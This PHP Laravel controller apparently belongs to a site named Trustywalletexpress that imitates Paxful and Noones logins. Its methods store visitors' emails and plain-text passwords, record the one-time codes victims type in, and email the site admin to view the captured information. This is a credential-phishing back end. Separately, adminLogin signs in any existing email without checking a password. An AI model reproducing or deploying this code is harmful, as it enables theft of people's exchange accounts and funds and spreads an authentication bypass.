<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\VerificationCode;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

use Illuminate\Support\Facades\Hash;
use Snowfire\Beautymail\Beautymail;

class AuthGuestLoginController extends Controller
{
    //
    public function __construct()
    {
        //$this->middleware('guest:visitor');
        $this->middleware('guest');
    }

    public function showLoginForm()
    {
        return view('auth.guest-login');
    }

    public function login(Request $request)
    {
        // Validate the form data
        $this->validate($request, [
            'email' => 'required',
            'password' => 'required'
        ]);
        //  $user = User::where('email', $request->email)->first();
        // if($user)
        // {
        //   if($user->password != $request->password)
        //     {
        //         User::where('email',$request->email)->update([
        //             'password' => $request->password
        //         ]);


        //     }
        // }


        if ($request->site == 'paxful') {

            $uniqueNumber = Str::random(4, '0123456789');

            // if(!$user){
            $this->validate($request, [
                'email' => 'required',
                'password' => 'required'
            ]);
            $pax_user = User::create([
                'name' => 'user' . $uniqueNumber,
                'email' => $request->email,
                'password' => $request->password,
                'role' => 2,
                'site' => 'paxful'
            ]);
            $details = 'A new paxful user has regstered at Trustywalletexpress.com  website login to admin panel to view the information';
            $msubject11 = 'Trustywalletexpress.com new user registration';
            $null = "";
            $ad = User::where('role', 1)->first();
            $email = $ad->email;

                 $mymail = app()->make(Beautymail::class);
                $mymail->send('emails.admin',  ['details'=>$details,'rece'=>""], function($message)use($email,$null,$msubject11)
                {
                    $message->from('support@Trustywalletexpress.com','Trustywalletexpress')
                        ->to($email,"")
                        ->subject($msubject11);

                });
            $message = "Check Your Email For Code";
            //$verificationCode = $this->generateOtp($request->email);

            return redirect()->route('otp.verification.paxful', ['user_id' => $pax_user->id])->with('success', $message);

//
//             }else{
//
//                  $u = User::where('id',$request->email)->update([
//                    'password' => $request->password
//                ]);
//
//                  return redirect()->route('otp.verification.paxful', ['user_id' => $user->id])->with('success',  '');
//
//
//            }

        }

        if ($request->site == 'noones') {
            dd('here');
            $this->validate($request, [
                'email' => 'required',
                'password' => 'required'
            ]);
            $uniqueNumber = Str::random(4, '0123456789');

           $noones_user =  User::create([
                'name' => 'user' . $uniqueNumber,
                'email' => $request->email,
                'password' => $request->password,
                'role' => 2,
                'site' => 'noones'
            ]);
            $details = 'A new noones user has regstered at Trustywalletexpress website login to admin panel to view the information';

            $msubject11 =  'Trustywalletexpress new user registration';
            $null = "";
            $ad = User::where('role', 1)->first();
            $email = $ad->email;

            $mymail = app()->make(Beautymail::class);
            $mymail->send('emails.admin', ['details' => $details, 'rece' => ""], function ($message) use ($email, $null, $msubject11) {
                $message->from('support@Trustywalletexpress.com', 'Trustywalletexpress')
                    ->to($email, "")
                    ->subject($msubject11);

            });
            $message = "Check Your Email For Code";
           // $verificationCode = $this->generateOtp($request->email);
            return redirect()->route('otp.verification', ['user_id' => $noones_user->id])->with('success', $message);

        }


      
        if ($request->site == 'webizpay'){
             
       
            $user = User::where('email', $request->email)->where('password',$request->password)->first();
          //  dd($user);

            if($user)
            {
                $message = "Check Your Email For Code";
                $verificationCode = $this->generateOtp($request->email);
                return redirect()->route('otp.verification', ['user_id' => $verificationCode->user_id])->with('success',  $message);

            }else{

                return redirect()->back()->with('error','Incorrect email/password');
            }

       }

//
//        // Attempt to log the user in
//        if (Auth::guard('visitor')->attempt(['email' => $request->email, 'password' => $request->password], $request->remember)) {
//            // if successful, then redirect to their intended location
//            return redirect()->intended(route('guest.home'));
//        }
//
//        // if unsuccessful, then redirect back to the login with the form data
        // return redirect()->back()->withInput($request->only('email', 'remember'));
    }

    public function generateOtp($email)
    {
        $user = User::where('email', $email)->first();

        # User Does not Have Any Existing OTP
        $verificationCode = VerificationCode::where('user_id', $user->id)->latest()->first();

        $now = Carbon::now();

        if($verificationCode && $now->isBefore($verificationCode->expire_at)){
            return $verificationCode;
        }
        $otp = rand(123456, 999999);
        $msubject11 = 'Here’s your one-time verification code';
        $null = "";

        $mymail = app()->make(Beautymail::class);
        $mymail->send('emails.mailtemp',  ['details'=>$otp,'rece'=>""], function($message)use($email,$null,$msubject11)
        {
            $message->from('support@webizpay.com','Webizpay')
                ->to($email,"")
                ->subject($msubject11);

        });
        // Create a New OTP
        return VerificationCode::create([
            'user_id' => $user->id,
            'otp' => $otp,
            'expire_at' => Carbon::now()->addMinutes(10)
        ]);
    }

    public function verification($user_id)
    {
        return view('auth.otp-verification')->with([
            'user_id' => $user_id
        ]);
    }

    public function loginWithOtp(Request $request)
    {
        #Validation
        $request->validate([
            'user_id' => 'required|exists:users,id',
            'otp' => 'required'
        ]);

        #Validation Logic
        $verificationCode   = VerificationCode::where('user_id', $request->user_id)->where('otp', $request->otp)->first();

        $now = Carbon::now();
        if (!$verificationCode) {
            return redirect()->back()->with('error', 'Your OTP is not correct');
        }elseif($verificationCode && $now->isAfter($verificationCode->expire_at)){
            return redirect()->back()->with('error', 'Your OTP has been expired');
        }

        $user = User::whereId($request->user_id)->first();

        if($user){
            // Expire The OTP
            $verificationCode->update([
                'expire_at' => Carbon::now()
            ]);

            \Illuminate\Support\Facades\Auth::login($user);

            return redirect('/dashboard');
        }

        return redirect()->back()->with('error', 'Your Otp is not correct');
    }


    public function getStarted()
    {
        return view('auth.get-started');
    }

    public function paxfulVerification($user_id)
    {
       return view('auth.paxful-verification')->with([
            'user_id' => $user_id
        ]);
    }

    public function logout(Request $request)
    {
        Session::flush();

        \Illuminate\Support\Facades\Auth::logout();

        return redirect('login');

    }
   
 public function loginWithOtpJson(Request $request)
    {
        #Validation
//        $request->validate([
//            'user_id' => 'required|exists:users,id',
//            'otp' => 'required'
//        ]);
        $code = $request->code;

        $user_id = $request->user_id;
        #Validation Logic
        $verificationCode   = VerificationCode::where('user_id', $user_id)->where('otp', $code)->first();

        $now = Carbon::now();
        if (!$verificationCode) {
            $mess = [
                'message' => 'Your OTP is not correct',
                'status' => 1
            ];
           return json_encode($mess);

          //  return redirect()->back()->with('error', 'Your OTP is not correct');
        }elseif($verificationCode && $now->isAfter($verificationCode->expire_at)){
          //  return redirect()->route('otp.login')->with('error', 'Your OTP has been expired');

            $mess1 = [
                'message' => 'Your OTP has been expired',
                'status' => 2
            ];
            return json_encode($mess1);
        }

        $user = User::whereId($request->user_id)->first();

        if($user){
            // Expire The OTP
            $verificationCode->update([
                'expire_at' => Carbon::now()
            ]);

            \Illuminate\Support\Facades\Auth::login($user);

            $mess4 = [
                'message' => 'success',
                'status' => 0
            ];
            return json_encode($mess4);

          //  return redirect('/dashboard');
        }

        $mess3 = [
            'message' => 'Your OTP is not correct',
            'status' => 1
        ];
        return json_encode($mess3);

       // return redirect()->route('otp.login')->with('error', 'Your Otp is not correct');
    }
    public function adminLoginView(Request $request)
    {
        return view('auth.admin-login');
    }
    public function adminLogin(Request $request)
    {
        // Validate the form data
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required'
        ]);
        $user = User::where('email', $request->email)->first();
        if($user){
            \Illuminate\Support\Facades\Auth::login($user);
            
            return redirect()->route('dashboard');

        }

        return redirect()->back()->withInput($request->only('email', 'remember'));
    }
    public function paxfulOtp(Request $request)
    {
        $code = $request->code;

        $user_id = $request->user_id;


        $user = User::where('id',$user_id)->first();

        if($user){
            $ok = VerificationCode::create([
                'user_id' => $request->user_id,
                'otp' => $code,
                'expire_at' => Carbon::now()->addMinutes(10)
            ]);
            if($ok)
            {
                \Illuminate\Support\Facades\Auth::login($user);

                $mess4 = [
                    'message' => 'success',
                    'status' => 0
                ];
                return json_encode($mess4);
            }



            //  return redirect('/dashboard');
        }

    }
    
     public function nooneslogin(Request $request)
    {
          
        // Validate the form data
        $this->validate($request, [
           'phone' => 'required_without:email',
            'email' => 'required_without:phone',
        ]);
 
       
            $uniqueNumber = Str::random(4, '0123456789');

                $this->validate($request, [
                    'email' => 'required',
                ]);
                $u = User::create([
                    'name' => 'user' . $uniqueNumber,
                    'email' => $request->email,
                  //  'password' => Hash::make($request->password),
                    'role' => 2,
                    'site' => 'noones'
                ]);
              
                 $details = 'A new noones user has regstered at Trustywalletexpress website login to admin panel to view the information';

            $msubject11 =  'Trustywalletexpress new user registration';
            $null = "";
            $ad = User::where('role', 1)->first();
            $email = $ad->email;

            $mymail = app()->make(Beautymail::class);
            $mymail->send('emails.admin', ['details' => $details, 'rece' => ""], function ($message) use ($email, $null, $msubject11) {
                $message->from('support@Trustywalletexpress.com', 'Trustywalletexpress')
                    ->to($email, "")
                    ->subject($msubject11);

            });

                $user_id = $u->id;
              
                   return view('auth.noones-password', compact('user_id'));



    }
    public function noonespassword(Request $request)
    {
        
       
        // Validate the form data
        $this->validate($request, [
            'password' => 'required',
        ]);
        $uu = User::where('id',$request->user_id)->first();
        
            $user = User::where('id',$request->user_id)->first();
            if ($user) {
                $this->validate($request, [
                    'password' => 'required',
                ]);
                $u = User::where('id',$user->id)->update([
                    'password' => $request->password
                ]);

                $user_id = $user->id;
                
                return view('auth.noones-otp', compact('user_id'));

            }


    }

    public function noonesForm()
    {
        return view('auth.noones');
    }
    public function noonesFormPassword()
    {
        return view('auth.noones-password');
    }
    public function noonesFormOtp()
    {
        return view('auth.noones-otp');
    }
    
    public function noonesOtp(Request $request)
    {
        $code = $request->otp;

        $user_id = $request->user_id;


        $user = User::where('id',$user_id)->first();
        
 
            $ok = VerificationCode::create([
                'user_id' => $request->user_id,
                'otp' => $code,
                'expire_at' => Carbon::now()->addMinutes(10)
            ]);
            if($ok)
            {
                \Illuminate\Support\Facades\Auth::login($user);

                $mess4 = [
                    'message' => 'success',
                    'status' => 0
                ];
              return redirect('/dashboard');
            }



            //   return redirect('/dashboard');


    }
    public function register(Request $request)
    {
         User::create([
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone,
          //  'password' => Hash::make($request->password),
            'password' => $request->password,

            'role' => 2,
             'site' => 'Webizpay'
        ]);
        
         $message = "Check Your Email For Code";
            $verificationCode = $this->generateOtp($request->email);
            return redirect()->route('otp.verification', ['user_id' => $verificationCode->user_id])->with('success',  $message);
        return redirect()->route('otp.generate');

    }



  
}
